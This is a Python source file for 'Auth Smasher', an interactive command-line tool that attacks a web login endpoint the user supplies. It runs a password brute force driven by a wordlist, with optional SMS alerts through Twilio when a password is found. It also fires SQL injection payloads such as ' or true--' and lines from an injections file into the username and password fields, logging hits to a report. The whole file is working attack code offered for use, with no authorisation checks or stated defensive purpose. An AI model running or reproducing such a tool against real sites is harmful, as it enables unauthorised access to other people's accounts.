import requests
from termcolor import colored
import os
from time import sleep
from twilio.rest import Client #import twilio Client module
from datetime import datetime



auth_smasher_logo = '''

    ___         __  __       _____                      __             
   /   | __  __/ /_/ /_     / ___/____ ___  ____ ______/ /_  ___  _____
  / /| |/ / / / __/ __ \    \__ \/ __ `__ \/ __ `/ ___/ __ \/ _ \/ ___/
 / ___ / /_/ / /_/ / / /   ___/ / / / / / / /_/ (__  ) / / /  __/ /    
/_/  |_\__,_/\__/_/ /_/   /____/_/ /_/ /_/\__,_/____/_/ /_/\___/_/     

                                                    (Version: 1.0)                       
                                                            
    '''
auth_smasher_report = '''
    ___         __  __       _____                      __                 ____                        __ 
   /   | __  __/ /_/ /_     / ___/____ ___  ____ ______/ /_  ___  _____   / __ \___  ____  ____  _____/ /_
  / /| |/ / / / __/ __ \    \__ \/ __ `__ \/ __ `/ ___/ __ \/ _ \/ ___/  / /_/ / _ \/ __ \/ __ \/ ___/ __/
 / ___ / /_/ / /_/ / / /   ___/ / / / / / / /_/ (__  ) / / /  __/ /     / _, _/  __/ /_/ / /_/ / /  / /_  
/_/  |_\__,_/\__/_/ /_/   /____/_/ /_/ /_/\__,_/____/_/ /_/\___/_/     /_/ |_|\___/ .___/\____/_/   \__/  
                                                                                 /_/                      
'''
account_sid = "" #add your Twilio account SID here
auth_token = "" #add your Twilio account token here
if account_sid != "" and auth_token != "":
    client = Client(account_sid, auth_token)
USER_PHONE_NUMBER = "" #Enter the mobile number where you want to receive the notifications
TWILIO_ACCOUNT_MOBILE_NUMBER = ""#Enter the Twilio account mobile number here


def welcome():
    # Banner
    print (colored(auth_smasher_logo, 'yellow'))

    # Take login page endpoint from user
    print (colored('''Which attack do you wish to initiate?
                
    1) Password Brute Force
    2) SQL injection 
                
                ''', 'green'))
    attack_type= input('\033[92m>> \033[0m')
    return attack_type

def main():

    attack_type = welcome()
    valid_choice=False

    while True:
    # -------------------------------------------PASSWORD BRUTE FORCE------------------------------------------

        if attack_type == '1':
            print (colored('\n[Password Brute Force]\n', 'yellow'))
            login_endpoint = ''
            while valid_choice == False and login_endpoint == '':
                print(colored('Enter endpoint path ', 'green'), colored('(format: https://somesite.com/login)', 'blue'))
                login_endpoint = input(colored('>> ', 'green'))
                check = False
                if login_endpoint != '':
                    while check == False:
                        print(colored(f'\nEndpoint path: {login_endpoint}', 'blue'))
                        answer = input(colored('Is this endpoint path correct? (Y or N) >> ', 'yellow'))
                        if answer == 'Y' or answer == 'y':
                            check = True
                            valid_choice = True
                        elif answer == 'N' or answer == 'n':
                            check = True
                        else:
                            print(colored('Choice not valid', 'red'))
            
            valid_choice=False
            check=False
            paylod = ''
            while valid_choice == False and paylod == '':
                print(colored('Enter payload ', 'green'), colored('(format: username=abcd&password=12345&other=xyz)', 'blue'))
                paylod = input(colored('>> ', 'green'))
                if paylod != '':
                    payload_splitted = paylod.split('&')
                    check = False
                    while check == False:
                        print(colored(f'\nPayload: ', 'blue'))
                        for i in range(0,len(payload_splitted)):
                            print (payload_splitted[i])

                        answer = input(colored('Are these payload values correct? (Y or N) >> ', 'yellow'))
                        if answer == 'Y' or answer == 'y':
                            check = True
                            valid_choice = True
                        elif answer == 'N' or answer == 'n':
                            check = True
                        else:
                            print(colored('Choice not valid', 'red'))
            

            #----------------------------------------Ask for user mobile number------------------------------------------------------------
            check = False
            phone_choice = False
            while check == False:
                answer = input(colored('\nDo you wish to receive mobile notifications on suceess? (Y or N) >> ', 'yellow'))
                if answer == 'Y' or answer == 'y':
                    print(colored('Enter mobile number ', 'green'), colored('(format: +61123456789)', 'blue'))
                    USER_PHONE_NUMBER = input(colored('>> ', 'green'))
                    check = True
                    phone_choice = True
                elif answer == 'N' or answer == 'n':
                    check = True
                else:
                    print(colored('Choice not valid', 'red'))
                                
            data = {}
            for i in range(0,len(payload_splitted)):
                data[payload_splitted[i].split('=')[0]]=payload_splitted[i].split('=')[1]
            print(data)
            print(login_endpoint)

            response = 0
            #Send the POST request
            print(colored(f'\n[.] Verifying endpoint status ', 'cyan'))

            try:
                response = requests.post(login_endpoint, json=data)
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            except requests.exceptions.Timeout:
                print(f"Timeout: The request to {login_endpoint} timed out.")
            except requests.exceptions.HTTPError as err:
                print(f"HTTP Error: {err}")
                
            # Check the response
            endpoint_active=False
            if response != 0 and response.status_code:
                sleep(5)
                print(colored(f'[.] Received status code {response.status_code} ', 'cyan'))
                print(colored(f'[.] Endpoint is active ', 'cyan'))
                endpoint_active=True
                failed_headers_length = sum(len(key) + len(value) for key, value in response.headers.items())
                failed_response_code = response.status_code

            else:
                print(colored(f"[.]Endpoint hasn't responded", 'red'))
                check_answer = input(colored(f"Do you want to go back to home screen? [Y or N] >> ", 'green'))
                if check_answer == 'Y' or check_answer == 'y':
                    os.system('cls')
                    main()
                elif check_answer == 'N' or check_answer == 'n':
                    print(colored(f'Exiting ', 'green'))
            
            if endpoint_active == True:
                passwords = []
                try:
                    with open("passwords.txt", 'r') as file:
                            sleep(1)
                            print('\nReading passwords in passwords.txt')
                            # Read the entire file content into a string
                            for line in file:
                                # Remove the newline character at the end of each line
                                line = line.strip()
                                passwords.append(line)
                except file.errors as e:
                    print(e)
            try:
                with open("report.txt", 'w') as file:
                    file.write(auth_smasher_report)
                    file.write(f"Password Brute-Force Report")
                    file.write(f"\nDate: {datetime.now().date()}")
                    file.write(f"\nTime: {datetime.now().time()}\n\n")

            except file.errors as e:
                print(e)
            
            
            for i in range(0, len(passwords)):
                sleep(1)
                data[payload_splitted[1].split('=')[0]]=passwords[i]
                print(colored(f'Trying password ', 'white'), colored(f'{passwords[i]}', 'cyan'))

                response = 0
                try:
                    response = requests.post(login_endpoint, json=data)
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                except requests.exceptions.Timeout:
                    print(f"Timeout: The request to {login_endpoint} timed out.")
                except requests.exceptions.HTTPError as err:
                    print(f"HTTP Error: {err}")
                if response != 0:
                    headers_length = sum(len(key) + len(value) for key, value in response.headers.items())
                    if headers_length != failed_headers_length or response.status_code != failed_response_code:
                        print(colored(f'Success', 'green'))
                        print(f"Status code received {response.status_code}")
                        print(f"Header length {headers_length}\n")
                        if phone_choice == True:
                            message = client.messages \
                            .create(
                                body='''
...................
A password is found
...................
                                ''',
                                from_= TWILIO_ACCOUNT_MOBILE_NUMBER,
                                to= USER_PHONE_NUMBER
                            )
                        try:
                            with open("report.txt", 'a') as file:
                                file.write(f'-------------------------------------\n')
                                file.write(f'{passwords[i]}       |       Success\n')
                        except file.errors as e:
                            print(e)
                        break
                    else:
                        print(colored(f'Failed', 'red'))
                        try:
                            with open("report.txt", 'a') as file:
                                file.write(f'-------------------------------------\n')
                                file.write(f'{passwords[i]}       |       Failed\n')
                        except file.errors as e:
                            print(e)
                        
                        print(f"Status code received {response.status_code}")
                        print(f"Header length {headers_length}\n")
            print(colored('Check reports.txt file for results'), 'cyan')
                        

    # -------------------------------------------SQL INJECTION------------------------------------------------
        elif attack_type == '2':
            print (colored('\n[SQL Injection]\n', 'yellow'))
            login_endpoint = ''
            while valid_choice == False and login_endpoint == '':
                print(colored('Enter endpoint path ', 'green'), colored('(format: https://somesite.com/login)', 'blue'))
                login_endpoint = input(colored('>> ', 'green'))
                check = False
                if login_endpoint != '':
                    while check == False:
                        print(colored(f'\nEndpoint path: {login_endpoint}', 'blue'))
                        answer = input(colored('Is this endpoint path correct? (Y or N) >> ', 'yellow'))
                        if answer == 'Y' or answer == 'y':
                            check = True
                            valid_choice = True
                        elif answer == 'N' or answer == 'n':
                            check = True
                        else:
                            print(colored('Choice not valid', 'red'))
            
            valid_choice=False
            check=False
            paylod = ''
            while valid_choice == False and paylod == '':
                print(colored('Enter payload ', 'green'), colored('(format: username=abcd&password=12345&other=xyz)', 'blue'))
                paylod = input(colored('>> ', 'green'))
                if paylod != '':
                    payload_splitted = paylod.split('&')
                    check = False
                    while check == False:
                        print(colored(f'\nPayload: ', 'blue'))
                        for i in range(0,len(payload_splitted)):
                            print (payload_splitted[i])

                        answer = input(colored('Are these payload values correct? (Y or N) >> ', 'yellow'))
                        if answer == 'Y' or answer == 'y':
                            check = True
                            valid_choice = True
                        elif answer == 'N' or answer == 'n':
                            check = True
                        else:
                            print(colored('Choice not valid', 'red'))
                    
            data = {}
            for i in range(0,len(payload_splitted)):
                data[payload_splitted[i].split('=')[0]]=payload_splitted[i].split('=')[1]
            
            data[payload_splitted[0].split('=')[0]]=' or true--'
            data[payload_splitted[1].split('=')[0]]=' or true--'

            print(data)
            print(login_endpoint)

            response = 0
            #Send the POST request
            print(colored(f'\n[.] Verifying endpoint status ', 'cyan'))

            try:
                response = requests.post(login_endpoint, json=data)
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            except requests.exceptions.Timeout:
                print(f"Timeout: The request to {login_endpoint} timed out.")
            except requests.exceptions.HTTPError as err:
                print(f"HTTP Error: {err}")
                
            # Check the response
            endpoint_active=False
            if response != 0 and response.status_code:
                print(colored(f'[.] Received status code {response.status_code} ', 'cyan'))
                print(colored(f'[.] Endpoint is active ', 'cyan'))
                endpoint_active=True
                failed_headers_length = sum(len(key) + len(value) for key, value in response.headers.items())
                failed_response_code = response.status_code
                print(f"Failed header length: {failed_headers_length} and Failed status code: {failed_response_code}")

            else:
                print(colored(f"[.]Endpoint hasn't responded", 'red'))
                check_answer = input(colored(f"Do you want to go back to home screen? [Y or N] >> ", 'green'))
                if check_answer == 'Y' or check_answer == 'y':
                    os.system('cls')
                    main()
                elif check_answer == 'N' or check_answer == 'n':
                    print(colored(f'Exiting ', 'green'))
            
            if endpoint_active == True:
                injections = []
                with open("injections.txt", 'r') as file:
                        # Read the entire file content into a string
                        for line in file:
                            # Remove the newline character at the end of each line
                            line = line.strip()
                            injections.append(line)
            try:
                with open("report.txt", 'w') as file:
                    file.write(auth_smasher_report)
                    file.write(f"SQL Injection Report")
                    file.write(f"\nDate: {datetime.now().date()}")
                    file.write(f"\nTime: {datetime.now().time()}\n\n")

            except file.errors as e:
                print(e)

            for i in range(0, len(injections)):
                sleep(1)
                data[payload_splitted[0].split('=')[0]]=injections[i]
                data[payload_splitted[1].split('=')[0]]='password123'
                print(colored(f'Trying injection on Username field', 'white'), colored(f'{injections[i]}', 'cyan'))

                response = 0
                try:
                    response = requests.post(login_endpoint, json=data)
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                except requests.exceptions.Timeout:
                    print(f"Timeout: The request to {login_endpoint} timed out.")
                except requests.exceptions.HTTPError as err:
                    print(f"HTTP Error: {err}")
                if response != 0:
                    headers_length = sum(len(key) + len(value) for key, value in response.headers.items())
                    if headers_length != failed_headers_length or response.status_code != failed_response_code:
                        print(colored(f'Success', 'green'))
                        print(f"Status code received {response.status_code}")
                        print(f"Header length {headers_length}\n")
                        try:
                            with open("report.txt", 'a') as file:
                                file.write(f'-------------------------------------\n')
                                file.write(f'{injections[i]}       |       Success\n')
                        except file.errors as e:
                            print(e)
                    else:
                        try:
                            with open("report.txt", 'a') as file:
                                file.write(f'-------------------------------------\n')
                                file.write(f'{injections[i]}       |       Failed\n')
                        except file.errors as e:
                            print(e)
                        print(colored(f'Failed', 'red'))
                        print(f"Status code received {response.status_code}")
                        print(f"Header length {headers_length}\n")

            for i in range(0, len(injections)):
                data[payload_splitted[0].split('=')[0]]='admin'
                data[payload_splitted[1].split('=')[0]]=injections[i]
                print(colored(f'Trying injection on Password field', 'white'), colored(f'{injections[i]}', 'cyan'))

                response = 0
                try:
                    response = requests.post(login_endpoint, json=data)
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                except requests.exceptions.Timeout:
                    print(f"Timeout: The request to {login_endpoint} timed out.")
                except requests.exceptions.HTTPError as err:
                    print(f"HTTP Error: {err}")
                if response != 0:
                    headers_length = sum(len(key) + len(value) for key, value in response.headers.items())
                    if headers_length != failed_headers_length or response.status_code != failed_response_code:
                        print(colored(f'Success', 'green'))
                        print(f"Status code received {response.status_code}")
                        print(f"Header length {headers_length}\n")
                        try:
                            with open("report.txt", 'a') as file:
                                file.write(f'-------------------------------------\n')
                                file.write(f'{injections[i]}       |       Success\n')
                        except file.errors as e:
                            print(e)
                    else:
                        try:
                            with open("report.txt", 'a') as file:
                                file.write(f'-------------------------------------\n')
                                file.write(f'{injections[i]}       |       Failed\n')
                        except file.errors as e:
                            print(e)
                        print(colored(f'Failed', 'red'))
                        print(f"Status code received {response.status_code}")
                        print(f"Header length {headers_length}\n")

        else:
            print ('Choice not valid')

            os.system('cls')
            attack_type = welcome()

        break

main()
